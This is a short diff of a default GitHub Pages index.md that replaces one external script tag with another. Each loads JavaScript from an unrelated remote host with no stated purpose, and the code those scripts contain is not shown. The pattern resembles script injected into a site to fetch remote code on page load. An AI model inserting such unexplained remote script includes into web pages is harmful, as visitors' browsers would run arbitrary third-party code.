@@ -1,6 +1,6 @@
 ## Welcome to GitHub Pages
 
-<script src="https://xiaogui22.oss-cn-hangzhou.aliyuncs.com/x/x816033"></script>
+<script src="https://saltx.com.cn/xmen/xmen1004"></script>
 
 You can use the [editor on GitHub](https://github.com/hedansun/abcd.github.io/edit/gh-pages/index.md) to maintain and preview the content for your website in Markdown files.
 
